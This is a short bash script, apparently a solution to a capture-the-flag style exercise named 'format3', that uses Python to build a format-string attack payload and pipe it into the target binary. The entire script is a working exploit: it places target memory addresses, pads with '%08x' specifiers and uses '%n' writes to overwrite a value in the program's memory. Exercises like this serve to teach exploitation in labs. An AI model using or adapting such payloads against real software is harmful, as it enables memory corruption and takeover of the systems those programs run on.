#!/bin/bash

python -c "print '\xf4\x96\x04\x08AAAA\xf5\x96\x04\x08BBBB\xf7\x96\x04\x08'+'%08x'*10+'%224u%n%273u%n%172u%n'" | ./format3
